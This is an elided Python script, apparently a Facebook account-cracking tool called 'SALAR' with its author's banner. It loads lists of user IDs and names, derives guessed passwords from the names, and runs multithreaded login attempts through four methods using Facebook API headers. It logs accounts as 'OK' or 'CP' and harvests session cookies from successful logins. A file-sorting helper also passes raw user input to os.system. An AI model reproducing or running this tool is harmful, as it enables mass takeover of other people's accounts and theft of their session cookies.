...
from concurrent.futures import ThreadPoolExecutor as sarfrazSALAR
from string import * 
...
sys.stdout.write('\x1b]2; SALAR\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m.d8888.  .d8b.  db       .d8b.  d8888b. 
\033[1;37m88'  YP d8' `8b 88      d8' `8b 88  `8D 
\033[1;32m`8bo.   88ooo88 88      88ooo88 88oobY' 
\033[1;32m  `Y8b. 88~~~88 88      88~~~88 88`8b   
\033[1;37mdb   8D 88   88 88booo. 88   88 88 `88. 
\033[1;37m`8888Y' YP   YP Y88888P YP   YP 88   YD 
   
\033[1;37m------------------------------------------------
\033[1;37m Owner   :  salar khanoo
\033[1;37m Facebook:  prince salar
\033[1;37m Github  :  shahijoker 
\033[1;37m Version :  2.9
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SALAR Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/0707266012')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/SaLarKhAno2005/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SALAR(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SALAR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SALARb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SALARb};{ckkk}"
                    print(f"\r{R} [SALAR-OK] {sid} | {ps} {S}")
                    oks.append(sid)
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SALAR] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SALAR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SALAR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazSALAR(max_workers=30) as SALARworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SALARworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SALARworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SALARworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SALARworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SALAR.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SALAR.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SALAR = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+SALAR+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SALAR )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back SALAR Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SALAR.txt\n') 
        filepath = input("Put File Name: ")
